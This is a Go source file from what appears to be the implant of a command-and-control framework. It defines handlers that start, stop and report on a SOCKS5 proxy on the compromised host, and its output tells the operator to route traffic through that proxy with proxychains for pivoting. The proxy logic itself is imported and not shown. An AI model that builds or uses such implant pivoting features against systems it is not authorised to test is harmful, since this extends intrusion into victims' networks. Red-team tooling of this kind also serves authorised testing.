package main

import (
	"fmt"

	"github.com/mjopsec/taburtuaiC2/implant/pivot"
	"github.com/mjopsec/taburtuaiC2/pkg/types"
)

func handleSOCKS5Start(cmd *types.Command, result *types.CommandResult) {
	addr := cmd.Socks5Addr
	if addr == "" {
		addr = "127.0.0.1:1080"
	}
	bound, err := pivot.StartSOCKS5(addr)
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = fmt.Sprintf("[+] SOCKS5 proxy listening on %s — configure proxychains to use it", bound)
}

func handleSOCKS5Stop(result *types.CommandResult) {
	result.Output = "[+] " + pivot.StopSOCKS5()
}

func handleSOCKS5Status(result *types.CommandResult) {
	result.Output = "[socks5] " + pivot.SOCKS5Status()
}
